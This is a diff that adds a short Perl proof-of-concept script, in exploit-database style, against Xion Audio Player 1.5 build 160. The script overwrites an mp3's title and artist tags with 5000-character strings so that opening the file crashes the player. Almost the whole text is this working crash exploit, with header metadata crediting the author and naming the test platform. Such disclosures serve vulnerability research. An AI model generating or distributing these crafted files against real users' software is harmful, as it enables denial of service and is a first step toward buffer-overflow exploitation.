@@ -1,0 +1,23 @@
+# Exploit Title: Xion Audio Player <= 1.5 (build 160) - Crash PoC
+# Date: 01-04-2016
+# Software Link: http://www.r2.com.au/downloads/files/xion-audio-player-v1.5b160.zip
+# Homepage: http://www.xionplayer.com/
+# Exploit Author: Charley Celice (stmerry)
+# Contact: https://twitter.com/charleycelice
+#
+# Category: Crash PoC
+# Tested on: Windows XP SP3 English
+# Details: Overflowing title/artist tags on an *.mp3 seems to crash the software.
+# (works on both standalone/portable versions)
+
+use MP3::Tag;
+
+$mp3 = MP3::Tag->new('legit.mp3'); # whatever mp3 you got handy
+
+$mp3->title_set('A' x 5000); # title/artist tags
+$mp3->artist_set('A' x 5000); # may vary although both seems to be needed
+
+$mp3->update_tags();  
+$mp3->close();
+
+print "[*] Completed.\n";
